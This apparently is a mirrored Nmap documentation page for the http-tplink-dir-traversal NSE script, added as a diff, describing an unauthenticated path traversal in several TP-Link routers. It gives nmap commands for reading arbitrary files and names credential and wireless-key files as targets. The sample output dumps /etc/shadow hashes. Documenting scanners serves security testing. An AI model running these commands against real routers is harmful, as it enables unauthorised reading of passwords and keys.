@@ -1,0 +1,386 @@
+﻿   <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<html>
+<head>
+    <title>http-tplink-dir-traversal NSE Script -VER007</title>
+    
+
+</HEAD>
+
+
+
+
+
+
+<a href="../nmap-script-help.html">HOME>>>>>>>>></a>
+
+
+
+<h1>File <code>http-tplink-dir-traversal</code></h1>
+
+
+
+<p>
+
+
+<a href="http://nmap.org/book/nse-script-format.html#nse-format-rules">脚本使用类型</a>:
+portrule
+<br>
+
+  脚本所属分类:
+  <i><a href="http://nmap.org/nsedoc/categories/vuln.html">vuln</a></i>, <i><a href="http://nmap.org/nsedoc/categories/exploit.html">exploit</a></i>
+  <br>
+
+脚本下载地址: <a href="http://nmap.org/svn/scripts/http-tplink-dir-traversal.nse">http://nmap.org/svn/scripts/http-tplink-dir-traversal.nse</a>
+</p>
+
+
+
+<h2> User Summary </h2>
+
+<p>
+Exploits a directory traversal vulnerability existing in several TP-Link wireless routers. Attackers may exploit this vulnerability to read any of the configuration and password files remotely and without authentication.
+</p>
+<p>
+This vulnerability was confirmed in models WR740N, WR740ND and WR2543ND but there are several models that use the same HTTP server so I believe they could be vulnerable as well. I appreciate 
+any help confirming the vulnerability in other models.
+</p>
+<p>
+Advisory:
+<ul>
+<li><a href="http://websec.ca/advisories/view/path-traversal-vulnerability-tplink-wdr740">http://websec.ca/advisories/view/path-traversal-vulnerability-tplink-wdr740</a>
+</li>
+</ul>
+</p>
+<p>
+Other interesting files:
+<ul>
+<li>/tmp/topology.cnf (Wireless configuration)
+</li>
+<li>/tmp/ath0.ap_bss (Wireless encryption key)</li>
+</ul>
+</p>
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+  
+  
+    
+      
+        
+      
+    
+  
+  
+    
+    
+  
+
+  
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+  
+  
+    
+      
+        
+      
+    
+      
+        
+      
+    
+      
+        
+      
+    
+      
+        
+      
+    
+  
+  
+    
+    
+  
+
+  
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+  
+  
+    
+      
+        
+      
+    
+      
+        
+      
+    
+      
+        
+      
+    
+      
+        
+      
+    
+      
+        
+      
+    
+      
+        
+      
+    
+  
+  
+    
+    
+  
+
+  
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+  
+  
+  
+
+
+
+  <h2> Script Arguments </h2>
+  <p>
+    
+      <h4> http-tplink-dir-traversal.rfile </h4>
+      <p>
+Remote file to download. Default: /etc/passwd</p>
+
+    
+      <h4> http-tplink-dir-traversal.outfile </h4>
+      <p>
+If set it saves the remote file to this location.
+</p>
+<p>
+Other arguments you might want to use with this script:
+<ul>
+<li>http.useragent - Sets user agent</li>
+</ul>
+</p>
+
+    
+
+    
+      <h4> smbdomain, smbhash, smbnoguest, smbpassword, smbtype, smbusername </h4>
+      See the documentation for the <a href="http://nmap.org/nsedoc/lib/smbauth.html#script-args">smbauth</a> library.
+    
+      <h4> http.max-cache-size, http.max-pipeline, http.pipeline, http.useragent </h4>
+      See the documentation for the <a href="http://nmap.org/nsedoc/lib/http.html#script-args">http</a> library.
+    
+      <h4> vulns.showall </h4>
+      See the documentation for the <a href="http://nmap.org/nsedoc/lib/vulns.html#script-args">vulns</a> library.
+    
+  </p>
+
+
+<h2> Example Usage </h2>
+<p>执行格式
+
+  <ul>
+  
+    <li><pre>nmap -p80 --script http-tplink-dir-traversal.nse &lt;target&gt;</pre></li>
+  
+    <li><pre>nmap -p80 -Pn -n --script http-tplink-dir-traversal.nse &lt;target&gt;</pre></li>
+  
+    <li><pre>nmap -p80 --script http-tplink-dir-traversal.nse --script-args rfile=/etc/topology.conf -d -n -Pn &lt;target&gt;
+</pre></li>
+  
+  </ul>
+
+</p>
+
+
+  <h2> Script Output </h2>
+<pre>PORT   STATE SERVICE REASON
+80/tcp open  http    syn-ack
+| http-tplink-dir-traversal: 
+|   VULNERABLE:
+|   Path traversal vulnerability in several TP-Link wireless routers
+|     State: VULNERABLE (Exploitable)
+|     Description:
+|       Some TP-Link wireless routers are vulnerable to a path traversal vulnerability that allows attackers to read configurations or any other file in the device.
+|       This vulnerability can be exploited remotely and without authenticatication.
+|       Confirmed vulnerable models: WR740N, WR740ND, WR2543ND
+|       Possibly vulnerable (Based on the same firmware): WR743ND,WR842ND,WA-901ND,WR941N,WR941ND,WR1043ND,MR3220,MR3020,WR841N.
+|     Disclosure date: 2012-06-18
+|     Extra information:
+|       /etc/shadow :
+|   
+|   root:$1$$zdlNHiCDxYDfeF4MZL.H3/:10933:0:99999:7:::
+|   Admin:$1$$zdlNHiCDxYDfeF4MZL.H3/:10933:0:99999:7:::
+|   bin::10933:0:99999:7:::
+|   daemon::10933:0:99999:7:::
+|   adm::10933:0:99999:7:::
+|   lp:*:10933:0:99999:7:::
+|   sync:*:10933:0:99999:7:::
+|   shutdown:*:10933:0:99999:7:::
+|   halt:*:10933:0:99999:7:::
+|   uucp:*:10933:0:99999:7:::
+|   operator:*:10933:0:99999:7:::
+|   nobody::10933:0:99999:7:::
+|   ap71::10933:0:99999:7:::
+|   
+|     References:
+|_      http://websec.ca/advisories/view/path-traversal-vulnerability-tplink-wdr740
+</pre>
+
+
+
+  <h2> Requires </h2>
+  <ul>
+  
+     <li><a href="http://nmap.org/nsedoc/lib/http.html">http</a></li>
+  
+     <li><a href="">io</a></li>
+  
+     <li><a href="http://nmap.org/nsedoc/lib/shortport.html">shortport</a></li>
+  
+     <li><a href="http://nmap.org/nsedoc/lib/stdnse.html">stdnse</a></li>
+  
+     <li><a href="">string</a></li>
+  
+     <li><a href="http://nmap.org/nsedoc/lib/vulns.html">vulns</a></li>
+  
+  </ul>
+
+
+<hr/>
+
+
+
+
+
+
+<p><b>Author: </b>Paulino Calderon &lt;calderon()websec.mx&gt;</p>
+
+
+
+<p><b>License: </b> VER007 整理 <a href="http://www.ver007.com">http://www.ver007.com</a></p>
+
+
+
+
+
+
+
+
+<h2> <font color="#ff0000">action</font> </h2>
+<dl class="function">
+  
+
+<dt><a name="action"></a><strong>action</strong>&nbsp;(host, port)</dt>
+<dd>
+
+<p>
+MAIN - The script checks for vulnerable devices by attempting to read "etc/shadow" and finding the pattern "root:".</p>
+
+
+
+
+<h3>Parameters</h3>
+<ul>
+	
+	<li>
+	  host:
+          
+	</li>
+	
+	<li>
+	  port:
+          
+	</li>
+	
+</ul>
+
+
+
+
+
+
+
+
+</dd>
+
+</dl>
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+</BODY>
+</HTML>
+
+
